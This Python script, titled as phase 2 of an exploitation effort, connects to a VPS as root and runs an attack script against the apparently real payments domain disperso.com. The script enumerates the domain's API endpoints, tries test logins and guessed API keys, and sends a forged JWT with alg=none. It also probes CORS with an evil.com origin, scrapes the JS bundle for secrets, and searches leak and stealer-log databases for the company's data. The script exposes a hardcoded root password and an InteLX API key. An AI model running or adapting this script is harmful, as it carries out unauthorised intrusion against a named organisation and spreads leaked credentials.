"""Phase 2: exploit the findings from phase 1."""
import paramiko, textwrap

VPS = "64.177.88.10"
PW = r"5F.jyTK$D6%.F{a="

REMOTE = textwrap.dedent(r'''
import json, urllib.request, urllib.error, ssl, time, re

ctx = ssl._create_unverified_context()

def req(url, data=None, headers=None, method=None, timeout=20):
    hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"}
    if headers:
        hdrs.update(headers)
    if isinstance(data, dict):
        data = json.dumps(data).encode()
    r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
        body = resp.read()
        return resp.status, body, dict(resp.headers)
    except urllib.error.HTTPError as e:
        body = e.read()
        return e.code, body, dict(e.headers)
    except Exception as e:
        return 0, str(e).encode(), {}

# ======================================================
print("=" * 60)
print("A. DISPERSO.COM ROBOTS.TXT + SITEMAP")
print("=" * 60)

s, b, h = req("https://disperso.com/robots.txt")
print(f"robots.txt ({s}):\n{b.decode(errors='replace')}")

s, b, h = req("https://disperso.com/sitemap.xml")
sitemap = b.decode(errors="replace")
print(f"\nsitemap.xml ({s}, {len(b)}b):")
urls = re.findall(r'<loc>(.*?)</loc>', sitemap)
for u in urls:
    print(f"  {u}")

# ======================================================
print("\n" + "=" * 60)
print("B. SOPORTE BACKEND API ENUM (real /api/* behind 401)")
print("=" * 60)

SOP = "https://soporte.disperso.com"
paths = [
    "/api/health", "/api/v1/health", "/api/auth/login", "/api/auth/register",
    "/api/auth/forgot-password", "/api/auth/signup", "/api/auth/session",
    "/api/login", "/api/register", "/api/signup", "/api/user", "/api/users",
    "/api/me", "/api/profile", "/api/ticket", "/api/tickets",
    "/api/public", "/api/public/ticket", "/api/public/config",
    "/api/v1/auth/login", "/api/v1/auth/session", "/api/v1/ticket",
    "/api/config", "/api/settings", "/api/version", "/api/info",
    "/api/kb", "/api/articles", "/api/categories", "/api/search",
    "/api/docs", "/api/swagger", "/api/openapi",
    "/api/forgot-password", "/api/reset-password",
    "/api/v1/public", "/api/v1/public/ticket", "/api/v1/public/kb",
    "/api/v1/config", "/api/v1/categories",
]
for p in paths:
    s, b, h = req(f"{SOP}{p}")
    ct = h.get("content-type", "")
    if "html" not in ct or s != 200:
        tag = "!!!" if s in (200,201) else "**" if s in (400,401,403,405,500) else ""
        print(f"  {tag} GET {p} -> {s} ({len(b)}b) {ct[:40]}")
        if s in (200,400,500) and len(b) < 500 and "html" not in ct:
            print(f"      {b[:300]}")
    time.sleep(0.2)

# POST variants
for p in ["/api/auth/login", "/api/login", "/api/auth/signin",
          "/api/v1/auth/login", "/api/v1/login"]:
    s, b, h = req(f"{SOP}{p}", data={"email":"test@test.com","password":"test123"},
                  headers={"Content-Type":"application/json"})
    ct = h.get("content-type","")
    if "html" not in ct or s != 200:
        tag = "!!!" if s in (200,) else "**" if s in (400,401,403) else ""
        print(f"  {tag} POST {p} -> {s} ({len(b)}b) {ct[:40]}")
        if len(b) < 500 and "html" not in ct:
            print(f"      {b[:300]}")
    time.sleep(0.3)

# ======================================================
print("\n" + "=" * 60)
print("C. YOPMAIL CHECK (confirmation code)")
print("=" * 60)

# Try to read yopmail inbox for probe@yopmail.com
for attempt in [
    "https://www.yopmail.com/en/",
    "https://yopmail.com/en/inbox?login=probe&p=1",
]:
    s, b, h = req(attempt)
    print(f"  {attempt.split('.com')[1][:40]} -> {s} ({len(b)}b)")
    if s == 200 and b"captcha" in b.lower():
        print("      Has CAPTCHA")
    time.sleep(0.5)

# ======================================================
print("\n" + "=" * 60)
print("D. CORRECT JS BUNDLE DOWNLOAD")
print("=" * 60)

# The real bundle is at /js/index.d8320218.js
s, b, h = req("https://app.disperso.com/js/index.d8320218.js")
print(f"  /js/index.d8320218.js -> {s} ({len(b)}b)")
if s == 200 and len(b) > 10000:
    content = b.decode(errors="replace")
    # Search for interesting patterns
    patterns = {
        "invite": re.findall(r'.{0,50}invite.{0,50}', content, re.IGNORECASE)[:5],
        "admin": re.findall(r'.{0,50}admin.{0,50}', content, re.IGNORECASE)[:5],
        "cognito-identity": re.findall(r'.{0,50}cognito-identity.{0,50}', content)[:5],
        "IdentityPool": re.findall(r'.{0,50}IdentityPool.{0,50}', content)[:5],
        "apikey": re.findall(r'.{0,50}apikey.{0,50}', content, re.IGNORECASE)[:5],
        "x-api-key": re.findall(r'.{0,50}x-api-key.{0,50}', content, re.IGNORECASE)[:5],
        "secret": re.findall(r'.{0,50}secret.{0,50}', content, re.IGNORECASE)[:5],
        "ADMIN": re.findall(r'"ADMIN[^"]*"', content)[:5],
        "ROLE": re.findall(r'"ROLE[^"]*"', content)[:5],
        "soporte": re.findall(r'.{0,50}soporte.{0,50}', content, re.IGNORECASE)[:5],
        "register": re.findall(r'.{0,30}register.{0,30}', content, re.IGNORECASE)[:10],
        "createUser": re.findall(r'.{0,30}createUser.{0,30}', content, re.IGNORECASE)[:5],
        "AdminCreate": re.findall(r'.{0,30}AdminCreate.{0,30}', content, re.IGNORECASE)[:5],
        "forgotPassword": re.findall(r'.{0,40}forgotPassword.{0,40}', content, re.IGNORECASE)[:5],
        "confirmSignUp": re.findall(r'.{0,40}confirmSignUp.{0,40}', content)[:5],
        "hosted_ui": re.findall(r'.{0,40}hosted.{0,40}', content, re.IGNORECASE)[:5],
        "identity_pool_id": re.findall(r'["\']us-east-2:[a-f0-9-]+["\']', content)[:5],
        "other_api": re.findall(r'https://[a-z0-9]+\.execute-api\.[a-z0-9-]+\.amazonaws\.com[^"\']*', content)[:10],
        "other_urls": re.findall(r'https://[a-z0-9.-]+\.disperso\.com[^"\']*', content)[:15],
        "s3_bucket": re.findall(r'[a-z0-9-]+\.s3[.a-z0-9-]*\.amazonaws\.com', content)[:5],
        "cloudfront": re.findall(r'[a-z0-9]+\.cloudfront\.net', content)[:5],
        "lambda_url": re.findall(r'https://[a-z0-9]+\.lambda-url\.[a-z0-9-]+\.on\.aws', content)[:5],
    }
    print(f"  Bundle size: {len(b):,} bytes")
    for k, v in patterns.items():
        if v:
            print(f"\n  {k}:")
            for m in v:
                print(f"    {m.strip()[:120]}")
else:
    print("  FAILED or same SPA catch-all")

# ======================================================
print("\n" + "=" * 60)
print("E. POSTMAN SEARCH")
print("=" * 60)

POSTMAN_KEY = os.environ.get("POSTMAN_API_KEY", "")
# Search for disperso workspaces
for entity in ["workspace", "collection", "api"]:
    s, b, h = req(f"https://api.getpostman.com/search/{entity}?q=disperso",
                  headers={"X-Api-Key": POSTMAN_KEY})
    if s == 200:
        d = json.loads(b)
        items = d.get("data", d.get("results", []))
        print(f"  Postman {entity}: {len(items)} results")
        for it in items[:5]:
            print(f"    {json.dumps(it, default=str)[:200]}")
    else:
        print(f"  Postman {entity}: {s}")
    time.sleep(0.5)

# Public Postman search
for q in ["disperso", "tuxpan+payments", "disperso+spei"]:
    s, b, h = req(f"https://www.postman.com/_api/ws/proxy", data={
        "service": "search",
        "method": "POST",
        "path": "/search-all",
        "body": {"queryIndices": ["runtime.collection"], "queryText": q, "size": 5, "from": 0}
    }, headers={"Content-Type":"application/json"})
    if s == 200:
        d = json.loads(b)
        items = d.get("data", [])
        print(f"\n  Public search '{q}': {len(items)} results")
        for it in items[:3]:
            print(f"    {it.get('name','?')} by {it.get('publisherHandle','?')}")
    else:
        print(f"  Public search '{q}': {s}")
    time.sleep(0.5)

# ======================================================
print("\n" + "=" * 60)
print("F. GITHUB CODE SEARCH")
print("=" * 60)

for query in [
    "disperso.com",
    "rdrrxexkm4.execute-api",
    "4fjbm9cornhgfqk4o8m33rjt2f",  # Cognito ClientId
    "us-east-2_SOCtEIx2s",  # User Pool ID
    "soporte.disperso.com",
]:
    s, b, h = req(f"https://api.github.com/search/code?q={query.replace(' ','+')}&per_page=5",
                  headers={"Accept":"application/vnd.github+json"})
    if s == 200:
        d = json.loads(b)
        print(f"  '{query}': {d.get('total_count',0)} results")
        for it in d.get("items", [])[:3]:
            print(f"    {it['repository']['full_name']}/{it['name']} ({it.get('path','')})")
    elif s == 422:
        print(f"  '{query}': 422 (requires auth)")
    else:
        print(f"  '{query}': {s}")
    time.sleep(2)

# ======================================================
print("\n" + "=" * 60)
print("G. SHODAN INTERNETDB")
print("=" * 60)

import socket
for host in ["app.disperso.com", "soporte.disperso.com", "disperso.com", "api.disperso.com"]:
    try:
        ip = socket.gethostbyname(host)
        s, b, h = req(f"https://internetdb.shodan.io/{ip}")
        if s == 200:
            d = json.loads(b)
            print(f"  {host} ({ip}): ports={d.get('ports',[])} vulns={d.get('vulns',[])} tags={d.get('tags',[])} hostnames={d.get('hostnames',[])}")
    except Exception as e:
        print(f"  {host}: {e}")
    time.sleep(0.3)

# ======================================================
print("\n" + "=" * 60)
print("H. COGNITO HOSTED UI (extended search)")
print("=" * 60)

prefixes = [
    "disperso", "app-disperso", "disperso-app", "disperso-prod",
    "disperso-production", "tuxpan", "tuxpan-disperso",
    "disperso-auth", "auth-disperso", "login-disperso",
    "disperso-payments", "disperso-pay", "pagos-disperso",
]
for pfx in prefixes:
    url = f"https://{pfx}.auth.us-east-2.amazoncognito.com/login?client_id=4fjbm9cornhgfqk4o8m33rjt2f&response_type=code&scope=openid+email&redirect_uri=https://app.disperso.com/"
    s, b, h = req(url)
    if s != 400 and s != 0:
        tag = "!!!" if s in (200, 302) else ""
        print(f"  {tag} {pfx}.auth.us-east-2... -> {s} ({len(b)}b)")
    time.sleep(0.3)

# ======================================================
print("\n" + "=" * 60)
print("I. DEEP API GATEWAY ENUM (CORS, OPTIONS, custom headers)")
print("=" * 60)

BASE = "https://rdrrxexkm4.execute-api.us-east-2.amazonaws.com/prod"

# OPTIONS requests to check CORS config
s, b, h = req(f"{BASE}/api/v1/notification", method="OPTIONS",
              headers={"Origin":"https://evil.com","Access-Control-Request-Method":"POST"})
print(f"  OPTIONS /notification: {s}")
for hk in ["access-control-allow-origin", "access-control-allow-methods", "access-control-allow-headers"]:
    if hk in h:
        print(f"    {hk}: {h[hk]}")

# Try with x-api-key header
for key in ["disperso", "test", "demo", "sandbox"]:
    s, b, h = req(f"{BASE}/api/v1/bank", headers={"x-api-key": key})
    if s != 403:
        print(f"  x-api-key={key}: {s}")
    time.sleep(0.2)

# Try different auth headers
s, b, h = req(f"{BASE}/api/v1/bank",
              headers={"Authorization": "Basic dGVzdDp0ZXN0"})
print(f"  Basic auth: {s} ({len(b)}b)")

s, b, h = req(f"{BASE}/api/v1/bank",
              headers={"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlRlc3QiLCJpYXQiOjE2NTAwMDAwMDB9."})
print(f"  JWT alg=none: {s} ({len(b)}b) {b[:200]}")

# Try different content types on notification
for ct in ["application/xml", "text/xml", "multipart/form-data; boundary=----"]:
    s, b, h = req(f"{BASE}/api/v1/notification",
                  data=b"<test>ssrf</test>" if "xml" in ct else b"------\r\nContent-Disposition: form-data; name=\"file\"\r\n\r\ntest\r\n--------\r\n",
                  headers={"Content-Type": ct})
    print(f"  notification CT={ct[:20]}: {s} ({len(b)}b)")
    time.sleep(0.2)

# ======================================================
print("\n" + "=" * 60)
print("J. INTELX STEALER / FILE SEARCH")
print("=" * 60)

INTELX_KEY = "6f65b43b-19df-4e12-aea3-115d793e9763"
INTELX = "https://2.intelx.io"

# Phonebook search
for term in ["disperso.com", "@disperso.com", "rdrrxexkm4.execute-api"]:
    s, b, h = req(f"{INTELX}/phonebook/search",
                  data={"term": term, "maxresults": 50, "media": 0, "target": 2},
                  headers={"x-key": INTELX_KEY, "Content-Type": "application/json"})
    if s == 200:
        d = json.loads(b)
        sid = d.get("id")
        print(f"  phonebook '{term}': id={sid}")
        if sid:
            time.sleep(3)
            s2, b2, h2 = req(f"{INTELX}/phonebook/search/result?id={sid}&limit=50",
                             headers={"x-key": INTELX_KEY})
            if s2 == 200:
                d2 = json.loads(b2)
                selectors = d2.get("selectors", [])
                print(f"    {len(selectors)} selectors")
                for sel in selectors[:30]:
                    print(f"      [{sel.get('selectortypeh','')}] {sel.get('selectorvalue','')}")
    else:
        print(f"  phonebook '{term}': {s}")
    time.sleep(1)

# Intelligent search for stealer logs
s, b, h = req(f"{INTELX}/intelligent/search",
              data={"term": "disperso.com", "maxresults": 10, "media": 0,
                    "buckets": ["leaks.logs", "leaks.public", "leaks.restricted"]},
              headers={"x-key": INTELX_KEY, "Content-Type": "application/json"})
if s == 200:
    d = json.loads(b)
    sid = d.get("id")
    print(f"\n  intelligent 'disperso.com': id={sid}")
    if sid:
        time.sleep(5)
        s2, b2, h2 = req(f"{INTELX}/intelligent/search/result?id={sid}&limit=10",
                         headers={"x-key": INTELX_KEY})
        if s2 == 200:
            d2 = json.loads(b2)
            records = d2.get("records", [])
            print(f"    {len(records)} records")
            for rec in records[:10]:
                print(f"    [{rec.get('bucketh','')}] {rec.get('name','')[:80]} size={rec.get('size',0)}")
        else:
            print(f"    result: {s2}")
elif s == 401:
    print(f"  intelligent: 401 (tier restriction)")
elif s == 402:
    print(f"  intelligent: 402 (credits)")
else:
    print(f"  intelligent: {s}")

print("\n" + "=" * 60)
print("PHASE 2 DONE")
print("=" * 60)
''')

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(VPS, username="root", password=PW, timeout=15)
sftp = ssh.open_sftp()
with sftp.file("/tmp/todo2.py", "w") as f:
    f.write(REMOTE)
sftp.close()
print("Running phase 2...")
stdin, stdout, stderr = ssh.exec_command("python3 /tmp/todo2.py 2>&1", timeout=240)
out = stdout.read().decode(errors="replace")
print(out)
ssh.close()
